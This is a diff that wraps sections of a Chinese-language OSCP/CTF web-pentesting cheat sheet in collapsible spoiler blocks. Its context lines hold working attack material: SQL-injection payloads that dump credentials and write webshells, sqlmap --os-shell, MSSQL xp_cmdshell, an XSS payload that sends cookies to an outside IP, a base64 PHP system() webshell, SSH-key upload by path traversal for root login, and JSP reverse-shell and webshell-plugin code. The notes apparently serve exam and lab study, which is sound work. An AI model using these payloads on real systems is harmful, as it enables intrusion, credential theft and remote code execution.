@@ -22,6 +22,9 @@ date: 2024-02-07
 
 - DNS Enumeration (OSCP 常考): 標準記錄列舉：查 A、AAAA、MX、NS、SOA、TXT 等記錄
 
+  <details markdown="1">
+  <summary><span class="spoiler">DNS Enumeration (OSCP 常考): 標準記錄列舉：查 A、AAAA、MX、…</span></summary>
+
   ```bash
   $ dnsrecon -d <domain> -t std # std 代表 standard type scan
   $ dnsenum <domain>
@@ -40,6 +43,8 @@ date: 2024-02-07
   # 子網域暴力破解
   $ dnsrecon -d <domain> -t brt -D wordlist.txt
   ```
+
+  </details>
 
   - [Whois](https://www.whois.com/whois) or [ipwhoisinfo](https://ipwhoisinfo.com/)
   - [DNS Lookup(從 Domain Name 看 IP)](https://www.whatismyip.com/dns-lookup/)
@@ -79,6 +84,9 @@ date: 2024-02-07
   ```
 - MSSQL
 
+  <details markdown="1">
+  <summary><span class="spoiler">MSSQL</span></summary>
+
   ```bash
   $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
   SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
@@ -98,12 +106,17 @@ date: 2024-02-07
   EXEC xp_cmdshell 'whoami';
   ```
 
+  </details>
+
 ##### SQLi
 
 - 先確認哪裡是注入點，例如 GET 參數或是在 Burp 看哪裡有 POST
 - Union-Based: 有兩個前提
   - 欄位數量要一致
   - 每一個欄位的 data type 都要和前一個 database 一樣
+
+  <details markdown="1">
+  <summary><span class="spoiler">每一個欄位的 data type 都要和前一個 database 一樣</span></summary>
 
   ```sql
   ' ORDER BY 1-- -
@@ -137,6 +150,8 @@ date: 2024-02-07
   INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
   ```
 
+  </details>
+
 - Error-Based
 
   ```sql
@@ -146,6 +161,9 @@ date: 2024-02-07
   ```
 
   因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELECT ，所以用前面的可能不會成功
+
+  <details markdown="1">
+  <summary><span class="spoiler">因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELE…</span></summary>
 
   ```sql
   # 撈資料庫名
@@ -160,6 +178,8 @@ date: 2024-02-07
   # 撈帳密
   ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)-- -
   ```
+
+  </details>
 
 - Boolean-Based
   ```sql
@@ -216,6 +236,9 @@ date: 2024-02-07
 
   - 基本必須參數(快速)
 
+    <details markdown="1">
+    <summary><span class="spoiler">基本必須參數(快速)</span></summary>
+
     ```bash
     # 只需確認是否可注入，並只顯示 payload 技術與後端技術
     $ sqlmap -u "URL"
@@ -242,7 +265,12 @@ date: 2024-02-07
     $ sqlmap -u <IP> --os-shell --batch --forms
     ```
 
+    </details>
+
   - 常用參數
+
+    <details markdown="1">
+    <summary><span class="spoiler">常用參數</span></summary>
 
     ```text
     # 讀檔案(前提)
@@ -318,6 +346,8 @@ date: 2024-02-07
     --flush-session
     ```
 
+    </details>
+
 #### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 
 ```html
@@ -374,6 +404,9 @@ fetch(`/getflag\)
 
   以下有幾個好用的 Payload
 
+  <details markdown="1">
+  <summary><span class="spoiler">以下有幾個好用的 Payload</span></summary>
+
   ```js
   # 簡單測試用
   <a href="javascript:alert(1)">test</a>
@@ -387,6 +420,8 @@ fetch(`/getflag\)
   # 用 document.location 跳轉(跳轉不受 mixed content 限制)
   <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
   ```
+
+  </details>
 
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
 
@@ -477,6 +512,9 @@ fetch(`/getflag\)
   1. 寫入 webshell 之類的達到 RCE
   2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper 是有 LFI 弱點才能用</span>
 
+  <details markdown="1">
+  <summary><span class="spoiler">利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 ph…</span></summary>
+
   ```bash
   $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
   php://filter/convert.base64-encode/resource=<file path> # 把 LFI 指定的檔案轉換成 base64 encode ，用絕對/相對路徑讀資料都可以
@@ -490,7 +528,12 @@ fetch(`/getflag\)
   $ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
   ```
 
+  </details>
+
   以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只顯示最基本的資訊，但透過 PHP wrapper 可以讀到更多，包含後端帳密
+
+  <details markdown="1">
+  <summary><span class="spoiler">以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只…</span></summary>
 
   ```bash
   kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
@@ -512,6 +555,8 @@ fetch(`/getflag\)
   $conn = new mysqli($servername, $username, $password);
   ...
   ```
+
+  </details>
 
 #### 利用 LFI 拿 reverse shell
 
@@ -583,12 +628,17 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
   - [ysoserial](https://github.com/frohoff/ysoserial): 紀錄 JAVA 版本的 POP chain gadgets
   - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 
+<details markdown="1">
+<summary><span class="spoiler">語言/序列化/反序列化/Magic Method 對照表</span></summary>
+
 | 語言   | 序列化         | 反序列化       | Magic Method                             |
 | ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Python | pickle.dumps() | pickle.loads() | `__reduce`                               |
 | PHP    | serialize      |                | unserialize                              | `__destruct()`: Object 被銷毀或 garbage collection 會觸發<br>`__wakeup()`: unserialize 時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成 String 處理時呼叫，`echo $obj;`<br> |
 | Java   |                |                | `toString`<br>`readObject`<br>`finalize` |
 | .NET   |                |                | ViewState & Session 會存放序列化資料     |
+
+</details>
 
 ### Frontend
 
@@ -677,6 +727,9 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
    ```
 1. 在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的 ssh rsa public key ，在封包中修改
 
+   <details markdown="1">
+   <summary><span class="spoiler">在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的…</span></summary>
+
    ```bash
    POST /upload HTTP/1.1
    Host: 192.168.232.16:8000
@@ -700,6 +753,8 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
    ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd--
    ```
 
+   </details>
+
 1. 只要上傳成功，就可以以 root 身份登入
    ```bash
    $ ssh root@192.168.232.16 -p 2222
@@ -715,6 +770,9 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
   <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
   ```
 - Reverse Shell
+  <details markdown="1">
+  <summary><span class="spoiler">Reverse Shell</span></summary>
+
   ```java
   <%@ page import="java.io.*" %>
   <%
@@ -727,6 +785,8 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
   }
   %>
   ```
+
+  </details>
 
 ### Webshell
 
@@ -747,6 +807,9 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
   ```
 - 上傳 Webshell-Plugin
 
+  <details markdown="1">
+  <summary><span class="spoiler">上傳 Webshell-Plugin</span></summary>
+
   ```bash
   $ cat > webshell-plugin.php << 'EOF'
   <?php
@@ -766,7 +829,12 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
   $ zip webshell-plugin.zip webshell-plugin.php
   ```
 
+  </details>
+
 ## Tools
+
+<details markdown="1">
+<summary><span class="spoiler">Fuck/Beautifier 對照表</span></summary>
 
 | Fuck                                                                    | Beautifier                                                                                |
 | ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
@@ -775,6 +843,8 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
 | [aaencode](https://utf-8.jp/public/aaencode.html)                       | [JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)                                          |
 | [Esolang List](https://esolangs.org/wiki/Language_list)                 | [JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)                                 |
 |                                                                         | [aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html) |
+
+</details>
 
 - psysh: PHP 的互動式 shell
 - pwsh: Kali 內建的 Powershell
